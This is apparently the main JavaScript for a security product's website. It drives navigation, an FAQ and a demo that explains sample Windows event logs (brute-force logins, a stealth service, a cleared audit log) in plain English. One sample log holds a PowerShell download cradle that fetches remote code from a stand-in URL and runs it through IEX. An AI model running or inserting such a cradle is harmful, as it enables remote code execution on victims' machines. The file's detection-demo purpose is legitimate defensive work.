/* ==========================================================================
   ThreatLens Official Website - Main Application Script
   Navigation, Plain-English Log Decoder, FAQ Accordion, CLI Copying
   ========================================================================== */

(function () {
  'use strict';

  // 1. Navigation Scroll Effect
  const navbar = document.querySelector('.navbar');
  window.addEventListener('scroll', () => {
    if (window.scrollY > 40) {
      navbar.classList.add('scrolled');
    } else {
      navbar.classList.remove('scrolled');
    }
  });

  // 2. Mobile Menu Toggle
  const mobileToggle = document.querySelector('.mobile-toggle');
  const mobileDrawer = document.querySelector('.mobile-menu-drawer');
  if (mobileToggle && mobileDrawer) {
    mobileToggle.addEventListener('click', () => {
      mobileDrawer.classList.toggle('active');
    });

    mobileDrawer.querySelectorAll('.nav-link').forEach(link => {
      link.addEventListener('click', () => {
        mobileDrawer.classList.remove('active');
      });
    });
  }

  // 3. Plain-English Windows Event Log Decoder Interactive Demo
  const LOG_TRANSLATIONS = {
    '4625': {
      title: 'Event ID 4625: An account failed to log on',
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
    <EventID>4625</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Keywords>0x8010000000000000</Keywords>
    <TimeCreated SystemTime="2026-09-17T13:42:10.884129300Z" />
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="SubStatus">0xc000006a</Data>
    <Data Name="FailureReason">%%2313</Data>
    <Data Name="IpAddress">194.26.29.112</Data>
    <Data Name="IpPort">58412</Data>
  </EventData>
</Event>`,
      headline: '⚠️ 42 Rapid Failed Logins Detected (Brute-Force Attack)',
      desc: 'Someone attempted to log into the "Administrator" account with incorrect passwords 42 times within 15 seconds from remote IP 194.26.29.112. ThreatLens identified this as an automated dictionary attack.',
      verdictText: '🚨 THREAT DETECTED · SUSPICIOUS IP FLAGGED',
      verdictClass: 'verdict-danger'
    },
    '7045': {
      title: 'Event ID 7045: A new service was installed in the system',
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-269f4a497045}" />
    <EventID>7045</EventID>
    <Level>4</Level>
    <Channel>System</Channel>
  </System>
  <EventData>
    <Data Name="ServiceName">SysDriverUpdaterSvc</Data>
    <Data Name="ImagePath">C:\\Users\\Public\\updater.exe -k</Data>
    <Data Name="ServiceType">user mode service</Data>
    <Data Name="StartType">auto start</Data>
    <Data Name="AccountName">LocalSystem</Data>
  </EventData>
</Event>`,
      headline: '⚠️ Stealth Windows Service Installed in Public Folder',
      desc: 'A background service named "SysDriverUpdaterSvc" was quietly installed and configured to run automatically as SYSTEM. Its executable is stored in a hidden public directory rather than Program Files.',
      verdictText: '🚨 PERSISTENCE DETECTED · AUTO-BLOCKED',
      verdictClass: 'verdict-danger'
    },
    '1102': {
      title: 'Event ID 1102: The audit log was cleared',
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce118}" />
    <EventID>1102</EventID>
    <Level>4</Level>
    <Channel>Security</Channel>
  </System>
  <UserData>
    <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
      <SubjectUserName>TargetUser</SubjectUserName>
      <SubjectDomainName>WORKGROUP</SubjectDomainName>
      <SubjectLogonId>0x3E7</SubjectLogonId>
    </LogFileCleared>
  </UserData>
</Event>`,
      headline: '🚨 CRITICAL: Windows Security Audit Log Deliberately Wiped',
      desc: 'The entire Windows Security event log history was intentionally purged. Intruders frequently clear security event logs to erase digital footprints and destroy evidence of breach activity.',
      verdictText: '🚨 CRITICAL MITRE T1070 · INCIDENT RAISED',
      verdictClass: 'verdict-danger'
    },
    '4104': {
      title: 'Event ID 4104: Execute a Remote Command (PowerShell ScriptBlock)',
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" />
    <EventID>4104</EventID>
    <Level>Warning</Level>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  </System>
  <EventData>
    <Data Name="ScriptBlockText">
      $wc = New-Object System.Net.WebClient;
      $wc.DownloadString('http://pastebin.raw/xyz') | IEX
    </Data>
  </EventData>
</Event>`,
      headline: '⚡ Encrypted Memory Download Cradle Blocked',
      desc: 'PowerShell executed an automated script block attempting to pull external code from the internet and execute it immediately in system memory via Invoke-Expression (IEX).',
      verdictText: '⚠️ SUSPICIOUS REMOTE EXECUTION · MITRE T1059',
      verdictClass: 'verdict-danger'
    }
  };

  const transTabs = document.querySelectorAll('.trans-tab-btn');
  const transRawCode = document.getElementById('trans-raw-code');
  const transHeadline = document.getElementById('trans-headline');
  const transDesc = document.getElementById('trans-desc');
  const transVerdict = document.getElementById('trans-verdict');

  function setLogDemo(eventId) {
    const data = LOG_TRANSLATIONS[eventId];
    if (!data) return;

    transTabs.forEach(tab => {
      if (tab.getAttribute('data-event') === eventId) {
        tab.classList.add('active');
      } else {
        tab.classList.remove('active');
      }
    });

    if (transRawCode) transRawCode.textContent = data.raw;
    if (transHeadline) transHeadline.textContent = data.headline;
    if (transDesc) transDesc.textContent = data.desc;
    if (transVerdict) {
      transVerdict.textContent = data.verdictText;
      transVerdict.className = `decoded-verdict-pill ${data.verdictClass}`;
    }
  }

  transTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      const eventId = tab.getAttribute('data-event');
      setLogDemo(eventId);
    });
  });

  // 4. Copy Code Snippet Buttons
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetSelector = btn.getAttribute('data-target');
      const targetEl = document.querySelector(targetSelector);
      if (!targetEl) return;

      const text = targetEl.textContent.trim();
      navigator.clipboard.writeText(text).then(() => {
        const originalText = btn.textContent;
        btn.textContent = '✓ COPIED!';
        btn.style.background = 'var(--accent-emerald)';
        btn.style.color = '#ffffff';

        setTimeout(() => {
          btn.textContent = originalText;
          btn.style.background = '';
          btn.style.color = '';
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy: ', err);
      });
    });
  });

  // 5. Interactive FAQ Accordion
  const faqItems = document.querySelectorAll('.faq-item');
  faqItems.forEach(item => {
    const questionBtn = item.querySelector('.faq-question');
    questionBtn.addEventListener('click', () => {
      const isActive = item.classList.contains('active');
      faqItems.forEach(other => other.classList.remove('active'));
      if (!isActive) {
        item.classList.add('active');
      }
    });
  });

  // 6. Smooth anchor scrolling offset
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      const targetId = this.getAttribute('href');
      if (targetId === '#') return;
      const target = document.querySelector(targetId);
      if (target) {
        e.preventDefault();
        const headerOffset = 80;
        const elementPosition = target.getBoundingClientRect().top;
        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
        window.scrollTo({
          top: offsetPosition,
          behavior: 'smooth'
        });
      }
    });
  });

})();
